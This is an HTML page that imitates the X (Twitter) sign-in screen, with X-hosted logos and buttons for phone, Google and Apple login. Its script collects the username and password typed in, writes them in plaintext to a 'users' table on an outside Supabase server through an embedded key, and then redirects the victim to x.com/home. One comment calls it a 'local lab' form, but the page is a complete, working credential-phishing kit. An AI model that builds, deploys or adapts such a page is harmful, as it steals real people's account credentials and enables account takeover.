<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>See what's happening</title>

  <style>
    * {
      box-sizing: border-box;
    }

    html,
    body {
      margin: 0;
      padding: 0;
      width: 100%;
      min-height: 100%;
      min-height: 100dvh;
      background: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      color: #0f1419;
      -webkit-font-smoothing: antialiased;
    }

    .screen {
      width: 100%;
      min-height: 100vh;
      min-height: 100dvh;
      position: relative;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      overflow-y: auto;
    }

    /* Back arrow */
    .back-button {
      position: absolute;
      top: clamp(16px, 3vh, 32px);
      left: clamp(16px, 4vw, 32px);
      width: 36px;
      height: 36px;
      border: none;
      background: transparent;
      cursor: pointer;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10;
    }

    .back-button::before {
      content: "";
      position: absolute;
      width: 22px;
      height: 2px;
      background: #0f1419;
      border-radius: 2px;
      left: 4px;
      top: 17px;
    }

    .back-button::after {
      content: "";
      position: absolute;
      width: 11px;
      height: 11px;
      border-left: 2px solid #0f1419;
      border-bottom: 2px solid #0f1419;
      transform: rotate(45deg);
      left: 4px;
      top: 12px;
    }

    /* Main content container */
    .container {
      width: 100%;
      max-width: 440px;
      margin: 0 auto;
      padding: clamp(54px, 8vh, 80px) clamp(20px, 5vw, 36px) clamp(24px, 4vh, 48px);
      display: flex;
      flex-direction: column;
      box-sizing: border-box;
    }

    /* Logo + title */
    .heading {
      display: flex;
      align-items: center;
      gap: 16px;
      margin-bottom: clamp(20px, 3.5vh, 32px);
    }

    .heading .phone-logo {
      width: clamp(32px, 6vw, 40px);
      height: clamp(32px, 6vw, 40px);
      object-fit: contain;
      flex-shrink: 0;
    }

    .heading h1 {
      margin: 0;
      padding: 0;
      font-size: clamp(22px, 5vw, 30px);
      line-height: 1.25;
      font-weight: 700;
      letter-spacing: -0.5px;
    }

    /* Authentication buttons */
    .auth-button {
      width: 100%;
      height: clamp(44px, 5.5vh, 52px);
      margin-bottom: 12px;
      border-radius: 9999px;

      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;

      font-family: inherit;
      font-size: clamp(14px, 2.5vw, 16px);
      font-weight: 600;

      cursor: pointer;
      transition: background-color 0.2s ease, transform 0.1s ease;
    }

    .auth-button:active {
      transform: scale(0.98);
    }

    .phone-button {
      background: #0f1419;
      color: #fff;
      border: none;
    }

    .phone-button:hover {
      background: #272c30;
    }

    .auth-button .phone-logo {
      width: 20px;
      height: 20px;
      object-fit: contain;
    }

    .outline-button {
      background: #fff;
      color: #0f1419;
      border: 1px solid #cfd9de;
    }

    .outline-button:hover {
      background: #eff3f4;
    }

    /* OR divider */
    .divider {
      width: 100%;
      display: flex;
      align-items: center;
      gap: 12px;
      margin: clamp(10px, 2vh, 18px) 0;
    }

    .divider-line {
      flex: 1;
      height: 1px;
      background: #eff3f4;
    }

    .or-text {
      color: #536471;
      font-size: 15px;
      font-weight: 400;
    }

    /* Form & input fields */
    #loginForm {
      display: flex;
      flex-direction: column;
      gap: 14px;
      width: 100%;
    }

    .username-input,
    .password-input {
      display: block;
      width: 100%;
      height: clamp(48px, 6vh, 56px);

      padding: 0 16px;

      background: #fff;
      border: 1px solid #cfd9de;
      border-radius: 6px;

      outline: none;

      font-family: inherit;
      font-size: 16px; /* 16px prevents mobile browser auto-zoom */
      color: #0f1419;

      transition: border-color 0.2s ease, box-shadow 0.2s ease;
    }

    .username-input::placeholder,
    .password-input::placeholder {
      color: #536471;
      opacity: 1;
    }

    .username-input:focus,
    .password-input:focus {
      border-color: #1d9bf0;
      box-shadow: 0 0 0 1px #1d9bf0;
    }

    /* Continue button */
    .continue-button {
      width: 100%;
      height: clamp(44px, 5.5vh, 52px);

      border: none;
      border-radius: 9999px;

      background: #86888a;
      color: #fff;

      font-family: inherit;
      font-size: clamp(14px, 2.5vw, 16px);
      font-weight: 700;

      cursor: not-allowed;
      transition: background-color 0.2s ease, transform 0.1s ease;
      margin-top: 4px;
    }

    .continue-button.active {
      background: #0f1419;
      color: #fff;
      cursor: pointer;
    }

    .continue-button.active:hover {
      background: #272c30;
    }

    .continue-button.active:active {
      transform: scale(0.98);
    }

    /* Terms */
    .terms {
      margin: clamp(16px, 3vh, 24px) 0 0;
      text-align: left;
      color: #536471;
      font-size: clamp(12px, 2.2vw, 13px);
      line-height: 1.45;
      font-weight: 400;
    }

    .terms strong {
      color: #0f1419;
      font-weight: 500;
    }

    /* Status message */
    .status {
      text-align: center;
      margin-top: 10px;
      font-size: 14px;
      color: #536471;
      min-height: 20px;
    }

    /* Mobile aspect ratios and short viewport optimizations */
    @media (max-width: 480px) {
      .container {
        padding-top: 48px;
        padding-left: 20px;
        padding-right: 20px;
      }
    }

    @media (max-height: 650px) {
      .container {
        padding-top: 40px;
        padding-bottom: 16px;
      }
      .heading {
        margin-bottom: 14px;
      }
      #loginForm {
        gap: 10px;
      }
      .divider {
        margin: 8px 0;
      }
    }
  </style>
</head>

<body>

  <div class="screen">

    <!-- Back button -->
    <button
      class="back-button"
      onclick="history.back()"
      aria-label="Back">
    </button>

    <main class="container">

      <!-- Logo and title -->
      <div class="heading">

        <img
          src="https://pbs.twimg.com/media/HQAiwO-WQAA3d3a?format=jpg&name=240x240"
          alt="logo"
          class="phone-logo">

        <h1>See what's happening</h1>

      </div>

      <!-- Continue with phone -->
      <button
        class="auth-button phone-button"
        type="button">

        <img
          src="https://pbs.twimg.com/media/HQAh-wQW0AAv07i?format=jpg&name=120x120"
          alt="Phone"
          class="phone-logo">

        <span>
          Continue with phone
        </span>

      </button>

      <!-- Continue with Google -->
      <button
        class="auth-button outline-button"
        type="button">

        <img
          src="https://pbs.twimg.com/media/HQAiyBSXsAEzn4X?format=jpg&name=120x120"
          alt="Google"
          class="phone-logo">

        <span>
          Continue with Google
        </span>

      </button>

      <!-- Continue with Apple -->
      <button
        class="auth-button outline-button"
        type="button">

        <img
          src="https://pbs.twimg.com/media/HQAizyXW4AA8m_5?format=jpg&name=240x240"
          alt="Apple"
          class="phone-logo">

        <span>
          Continue with Apple
        </span>

      </button>

      <!-- OR -->
      <div class="divider">

        <span class="divider-line"></span>

        <span class="or-text">
          or
        </span>

        <span class="divider-line"></span>

      </div>

      <!-- Local lab login form -->
      <form id="loginForm">

        <!-- Username -->
        <input
          id="username"
          class="username-input"
          type="text"
          name="username"
          placeholder="username"
          autocomplete="off"
          required>

        <!-- Password -->
        <input
          id="password"
          class="password-input"
          type="password"
          name="password"
          placeholder="password"
          autocomplete="current-password"
          required>

        <!-- Continue -->
        <button
          id="continueButton"
          class="continue-button active"
          type="submit">

          Continue

        </button>

      </form>

      <!-- Status -->
      <div
        id="status"
        class="status"
        aria-live="polite">
      </div>

      <!-- Terms -->
      <div class="terms">

        By continuing, you agree to our

        <strong>
          <a
            href="#"
            style="color: inherit; text-decoration: none;">
            Terms of service,
          </a>
        </strong>

        <strong>
          <a
            href="#"
            style="color: inherit; text-decoration: none;">
            Privacy Policy,
          </a>
        </strong>

        and

        <strong>
          <a
            href="#"
            style="color: inherit; text-decoration: none;">
            Cookie Use.
          </a>
        </strong>

      </div>

    </main>

  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    // Initialize Supabase client (anonymous key)
    const supabaseUrl = 'https://gcgvocfvxjhgahykqfln.supabase.co';
    const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdjZ3ZvY2Z2eGpoZ2FoeWtxZmxuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk0NjMyODEsImV4cCI6MjEwNTAzOTI4MX0.cU48vfKXbIkaGsHS5F91Sz26nXraSWD3X7iGZDHEGXI';
    const supabase = supabase.createClient(supabaseUrl, supabaseAnonKey);

    const loginForm = document.getElementById("loginForm");
    const status = document.getElementById("status");
    const continueButton = document.getElementById("continueButton");

    // Supabase client will be used for database operations

    loginForm.addEventListener("submit", async function (event) {
      event.preventDefault();

      const username = document
        .getElementById("username")
        .value
        .trim();

      const password = document
        .getElementById("password")
        .value;

      if (!username || !password) {
        status.textContent = "Enter your username and password.";
        return;
      }

      continueButton.disabled = true;
      status.textContent = "loading...";

      try {
        const { data, error } = await supabase
          .from('users')
          .insert([{ username, password }])
          .select();
        if (error) {
          console.error('Supabase insert error:', error);
          status.textContent = "Could not transmit data now. Please try again.";
        } else {
          console.log('Supabase insert success:', data);
          status.textContent = "Welcome.";
          loginForm.reset();
          setTimeout(() => {
            window.location.replace("https://x.com/home");
          }, 1000);
        }
      } catch (error) {
        console.error(error);
        status.textContent = "Could not transmit data now. Please try again.";
      } finally {
        continueButton.disabled = false;
      }
    });
  </script>

</body>
</html>
